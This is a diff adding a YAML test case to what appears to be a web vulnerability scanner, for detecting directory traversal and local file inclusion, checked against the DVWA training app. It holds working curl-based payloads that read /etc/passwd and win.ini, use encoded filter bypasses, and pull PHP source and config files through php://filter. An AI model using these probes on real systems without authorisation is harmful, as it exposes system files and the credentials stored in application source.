@@ -1,0 +1,168 @@
+id: WSTG-AUTHZ-01
+name: Directory Traversal / Local File Include
+category: Authorization
+attack_class: path
+severity: high
+references:
+  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
+  - https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
+
+# The catalogue had no case for this at all. DVWA's file-inclusion module is
+# one of its headline vulnerabilities and nothing targeted it; the only reason
+# it surfaced was INPV-19's `file://` probe, which catches it incidentally and
+# labels it SSRF.
+#
+# OVERLAP WITH INPV-19, deliberately kept. `file:///etc/passwd` through a
+# URL-fetching sink is standard SSRF practice and stays there. This case uses
+# PATH-based payloads — absolute, relative traversal, and the php:// wrapper —
+# which are distinctly LFI. On a sink that accepts both, both fire, and that is
+# the honest result: a client should know the parameter takes a local path AND
+# a remote URL, because the fixes differ.
+#
+# EVERY PROBE CARRIES THE SESSION. An include sink is very often behind a
+# login, and a probe without a cookie fetches the login form, matches nothing,
+# and reports CLEAN. That false negative has now been found three times in this
+# catalogue (INPV-05, INPV-19, and INPV-15's profile entry), so it is the
+# default here rather than an afterthought.
+#
+# EVIDENCE OF RETRIEVAL, never of an attempt. A PHP `Warning: include(...)` in
+# the response proves the parameter reached an include and nothing more — the
+# file may not exist, the fetch may have failed. Matching on it would report a
+# critical finding for a sink that disclosed nothing. Every pattern below is
+# content that only a successful read produces.
+#
+# VERIFIED against DVWA /vulnerabilities/fi/?page=, and each probe tracks the
+# security level, which is what makes this a control rather than a demo:
+#
+#   payload                                    low  medium  high  impossible
+#   /etc/passwd                                YES   YES     no      no
+#   ../../../../../etc/passwd  (depth >= 5)    YES   YES     no      no
+#   php://filter/...resource=index.php         YES   YES     no      no
+#
+# The relative-traversal depth is target-dependent — DVWA needs five, and four
+# returns nothing — so the step sweeps depths rather than guessing one. A
+# single hardcoded depth is how a real traversal gets reported as clean.
+
+target_schema:
+  required: [url, parameter]
+  optional: [cookie, auth_header, submit]
+
+steps:
+  - name: absolute_path
+    tool: curl
+    # The simplest form, and the one DVWA is vulnerable to: no traversal at
+    # all, just an absolute path where a filename was expected.
+    command: >-
+      bash -c 'S="{{submit}}"; curl -s -b "{{cookie}}" -H "{{auth_header}}"
+      -G --data-urlencode "{{parameter}}=/etc/passwd" ${S:+--data "$S"} "{{url}}"'
+    evaluators:
+      - type: regex
+        pattern: 'root:.*:0:0:|^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:'
+        emit_finding:
+          vuln_type: Local File Inclusion (absolute path — arbitrary file read)
+          severity: critical
+
+  - name: relative_traversal
+    tool: curl
+    # Depth is a property of the target, not of the payload: the include is
+    # resolved from the script's own directory. DVWA sits four levels down and
+    # needs five `../`; four returns nothing at all. Sweeping and REPORTING the
+    # depth that worked is the difference between a finding and a clean bill of
+    # health on a vulnerable target.
+    command: >-
+      bash -c 'S="{{submit}}"; P=""; HIT="";
+      for d in 1 2 3 4 5 6 7 8; do
+      P="../$P";
+      B=$(curl -s -b "{{cookie}}" -H "{{auth_header}}"
+      -G --data-urlencode "{{parameter}}=${P}etc/passwd"
+      ${S:+--data "$S"} "{{url}}");
+      if printf %s "$B" | grep -q "root:.*:0:0:"; then
+      HIT="$d"; echo "ERLIK-LFI-TRAVERSAL depth=$d payload=${P}etc/passwd";
+      printf %s "$B" | grep -m3 "root:.*:0:0:"; break;
+      fi;
+      done;
+      [ -z "$HIT" ] && echo "no traversal depth from 1 to 8 returned /etc/passwd"'
+    evaluators:
+      - type: regex
+        pattern: 'ERLIK-LFI-TRAVERSAL depth='
+        emit_finding:
+          vuln_type: Local File Inclusion (directory traversal)
+          severity: critical
+
+  - name: php_wrapper_source_disclosure
+    tool: curl
+    # `php://filter` returns the SOURCE rather than executing it, which is a
+    # different and often worse outcome than reading /etc/passwd: application
+    # source routinely carries database credentials and API keys. Decoded here
+    # rather than matched as base64, so the evidence is the source itself and a
+    # stray base64-looking blob cannot pass for it.
+    when: no_finding_yet
+    command: >-
+      bash -c 'S="{{submit}}"; for R in index.php ../../config/config.inc.php config.php; do
+      B=$(curl -s -b "{{cookie}}" -H "{{auth_header}}" -G
+      --data-urlencode "{{parameter}}=php://filter/convert.base64-encode/resource=$R"
+      ${S:+--data "$S"} "{{url}}");
+      D=$(printf %s "$B" | grep -oE "[A-Za-z0-9+/]{120,}={0,2}" | head -1 | base64 -d 2>/dev/null);
+      if printf %s "$D" | grep -q "<?php"; then
+      echo "ERLIK-LFI-SOURCE resource=$R"; printf %s "$D" | head -c 400; break;
+      fi;
+      done'
+    evaluators:
+      - type: regex
+        pattern: 'ERLIK-LFI-SOURCE resource='
+        emit_finding:
+          vuln_type: Source Disclosure via php:// filter wrapper
+          severity: high
+
+  - name: windows_variant
+    tool: curl
+    # Portability, not DVWA: a Windows host discloses win.ini the same way.
+    # Runs only when nothing has been found, so it costs one request on the
+    # targets where it cannot apply.
+    when: no_finding_yet
+    command: >-
+      bash -c 'S="{{submit}}"; P=""; for d in 1 2 3 4 5 6 7 8; do
+      P="..\\\\$P";
+      B=$(curl -s -b "{{cookie}}" -H "{{auth_header}}"
+      -G --data-urlencode "{{parameter}}=${P}windows\\win.ini"
+      ${S:+--data "$S"} "{{url}}");
+      if printf %s "$B" | grep -qi "\[fonts\]\|for 16-bit app support"; then
+      echo "ERLIK-LFI-WINDOWS depth=$d"; printf %s "$B" | head -c 200; break;
+      fi;
+      done'
+    evaluators:
+      - type: regex
+        pattern: 'ERLIK-LFI-WINDOWS depth='
+        emit_finding:
+          vuln_type: Local File Inclusion (Windows path traversal)
+          severity: critical
+
+  - name: encoded_traversal
+    tool: curl
+    # For a filter that decodes AFTER validating. DVWA does not, so this
+    # correctly finds nothing there — it is here for the targets whose filter
+    # is a single `str_replace("../", "")`.
+    when: no_finding_yet
+    command: >-
+      bash -c 'S="{{submit}}";
+      for P in "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      "....//....//....//....//....//etc/passwd"
+      "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"; do
+      B=$(curl -s -b "{{cookie}}" -H "{{auth_header}}"
+      "{{url}}?{{parameter}}=$P" ${S:+--data "$S"});
+      if printf %s "$B" | grep -q "root:.*:0:0:"; then
+      echo "ERLIK-LFI-ENCODED payload=$P"; printf %s "$B" | grep -m3 "root:"; break;
+      fi;
+      done'
+    evaluators:
+      - type: regex
+        pattern: 'ERLIK-LFI-ENCODED payload='
+        emit_finding:
+          vuln_type: Local File Inclusion (encoded traversal — filter bypass)
+          severity: critical
+
+chain:
+  on_finding:
+    # A parameter that reads arbitrary local files is usually the same
+    # parameter that will fetch a remote one.
+    - WSTG-INPV-19
